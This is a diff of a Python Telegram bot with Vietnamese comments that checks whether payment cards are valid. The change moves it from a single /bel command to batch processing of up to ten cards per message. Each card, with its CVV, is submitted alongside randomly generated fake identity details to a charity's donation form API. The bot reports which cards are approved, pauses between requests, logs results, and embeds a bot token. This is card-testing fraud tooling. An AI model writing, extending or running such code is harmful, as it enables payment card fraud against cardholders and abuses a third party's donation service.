@@ -5,7 +5,7 @@ import aiohttp
 import asyncio
 import nest_asyncio
 from telegram import Update
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from datetime import datetime
 import time
 
@@ -86,94 +86,122 @@ async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")
 
-# Hàm xử lý lệnh /bel
-async def bel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_input = " ".join(context.args)
-    card_info = extract_card_info(user_input)
+# Hàm xử lý tin nhắn
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_input = update.message.text
+    card_info_list = user_input.splitlines()  # Tách các thẻ theo từng dòng
+    card_results = []
+    total_time = 0
 
-    if card_info:
-        cc, mes, ano, cvv = card_info
-        current_year = int(datetime.now().strftime("%y"))
-        current_full_year = int(datetime.now().strftime("%Y"))
-        current_month = int(datetime.now().strftime("%m"))
+    with open("allowed_users.txt", "r") as f:
+        allowed_users = {int(line.strip()) for line in f.readlines()}
 
-        if len(ano) == 2:
-            ano = "20" + ano
-        ano = int(ano)
+    if update.effective_user.id not in allowed_users:
+        await update.message.reply_text("Người Dùng Không Được Phép Sử Dụng.")
+        return
 
-        if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
-            await update.message.reply_text(f"Thẻ {cc} hết hạn.")
-            return
+    for card_input in card_info_list[:10]:  # Chỉ lấy tối đa 10 thẻ
+        card_info = extract_card_info(card_input)
+        if card_info:
+            cc, mes, ano, cvv = card_info
 
-        phone = random_num(710000009, 900000009)
-        email = random_email()
-        name = random_name()
-        zipcode = random_zipcode()
+            # Kiểm tra tháng và năm hết hạn
+            current_year = int(datetime.now().strftime("%y"))
+            current_full_year = int(datetime.now().strftime("%Y"))
+            current_month = int(datetime.now().strftime("%m"))
 
-        await update.message.reply_text(f"Đang xử lý thẻ {cc}...")
+            if len(ano) == 2:
+                ano = "20" + ano
+            ano = int(ano)
 
-        start_time = time.time()  # Đo thời gian bắt đầu
-        async with aiohttp.ClientSession() as session:
-            async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
-                                    data={
-                                        'tfa_4': 'tfa_5',
-                                        'tfa_52': 'tfa_53',
-                                        'tfa_7': 'tfa_317',
-                                        'tfa_19': '1',
-                                        'tfa_20': '',
-                                        'tfa_21': name,
-                                        'tfa_23': 'Vu',
-                                        'tfa_27': phone,
-                                        'tfa_2276': zipcode,
-                                        'tfa_25': email,
-                                        'tfa_48': 'Web',
-                                        'tfa_50': 'tfa_50',
-                                        'tfa_59': cc,
-                                        'tfa_60': mes,
-                                        'tfa_70': ano,
-                                        'tfa_62': cvv,
-                                        'tfa_2273': 'G-BCL7XEG4WC',
-                                        'tfa_2274': 'GTM-WMPTRWL',
-                                        'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
-                                        'tfa_dbFormId': '151',
-                                        'tfa_dbResponseId': '',
-                                        'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
-                                        'tfa_dbWorkflowSessionUuid': '',
-                                        'tfa_dbTimeStarted': '1727426006',
-                                        'tfa_dbVersionId': '29',
-                                        'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
-                                    }) as response:
+            if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
+                card_results.append(f"Thẻ {cc} hết hạn.")
+                continue
 
-                response_text = await response.text()
-                response_time = time.time() - start_time  # Đo thời gian phản hồi
+            phone = random_num(710000009, 900000009)
+            email = random_email()
+            name = random_name()
+            zipcode = random_zipcode()
 
-                # Kiểm tra chuyển hướng
-                if response.history and response.status == 200:
-                    final_url = str(response.url)
-                    if "success" in final_url:
-                        await update.message.reply_text(f"Thẻ {cc} đã được phê duyệt!")
+            await update.message.reply_text(f"Đang xử lý thẻ {cc}...")
+
+            # Gửi yêu cầu tới API
+            start_time = time.time()  # Đo thời gian bắt đầu
+            async with aiohttp.ClientSession() as session:
+                async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
+                                        data={
+                                            'tfa_4': 'tfa_5',
+                                            'tfa_52': 'tfa_53',
+                                            'tfa_7': 'tfa_317',
+                                            'tfa_19': '1',
+                                            'tfa_20': '',
+                                            'tfa_21': name,
+                                            'tfa_23': 'Vu',
+                                            'tfa_27': phone,
+                                            'tfa_2276': zipcode,
+                                            'tfa_25': email,
+                                            'tfa_48': 'Web',
+                                            'tfa_50': 'tfa_50',
+                                            'tfa_59': cc,
+                                            'tfa_60': mes,
+                                            'tfa_70': ano,
+                                            'tfa_62': cvv,
+                                            'tfa_2273': 'G-BCL7XEG4WC',
+                                            'tfa_2274': 'GTM-WMPTRWL',
+                                            'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
+                                            'tfa_dbFormId': '151',
+                                            'tfa_dbResponseId': '',
+                                            'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
+                                            'tfa_dbWorkflowSessionUuid': '',
+                                            'tfa_dbTimeStarted': '1727426006',
+                                            'tfa_dbVersionId': '29',
+                                            'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
+                                        }) as response:
+
+                    response_text = await response.text()
+                    response_time = time.time() - start_time  # Đo thời gian phản hồi
+                    total_time += response_time
+
+                    # Kiểm tra chuyển hướng
+                    if response.history and response.status == 200:
+                        final_url = str(response.url)
+                        if "success" in final_url:
+                            card_results.append(f"Thẻ {cc} đã được phê duyệt!")
+                        else:
+                            error_message = extract_error_message(response_text)
+                            card_results.append(f"Thẻ {cc} bị từ chối: {error_message if error_message else 'Không rõ lý do.'}")
                     else:
-                        error_message = extract_error_message(response_text)
-                        await update.message.reply_text(f"Thẻ {cc} bị từ chối: {error_message if error_message else 'Không rõ lý do.'}")
-                else:
-                    await update.message.reply_text(f"Thẻ {cc} không thành công.")
+                        card_results.append(f"Thẻ {cc} không thành công.")
 
-                # Ghi log
-                with open("user_logs.txt", "a", encoding="utf-8") as log_file:
-                    log_file.write(f"User ID: {update.effective_user.id}, Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, Result: {'Approved' if 'success' in final_url else 'Declined'}\n")
-    else:
-        await update.message.reply_text("Thông tin thẻ không hợp lệ. Vui lòng nhập lại theo định dạng: <cc>|<mes>|<ano>|<cvv>")
+            await asyncio.sleep(5)  # Nghỉ 5 giây giữa các yêu cầu
+
+        else:
+            card_results.append(f"Thông tin thẻ không hợp lệ: {card_input}")
+
+    # Cập nhật tin nhắn cuối cùng với kết quả
+    result_message = "\n".join(card_results) + f"\nTổng thời gian: {total_time:.2f} giây"
+    await update.message.reply_text(result_message)
+
+    # Ghi log
+    with open("user_logs.txt", "a", encoding="utf-8") as log_file:  # Ghi log với mã hóa utf-8
+        for result in card_results:
+            log_file.write(f"User ID: {update.effective_user.id}, Result: {result}\n")
 
 # Hàm chính để khởi động bot
 async def main():
     app = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()
-
+    
+    # Thêm các trình xử lý lệnh
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("allow", allow_user))
     app.add_handler(CommandHandler("unallow", unallow_user))
-    app.add_handler(CommandHandler("bel", bel_command))  # Thêm lệnh /bel
 
-    await app.run_polling()
+    # Thêm trình xử lý tin nhắn
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+
+    # Gửi tin nhắn báo bot đã khởi động
+    await app.bot.send_message(chat_id=2077786453, text="Bot đã khởi động!")
+    await app.run_polling()  # Bắt đầu chạy bot
 
 if __name__ == "__main__":
     asyncio.run(main())
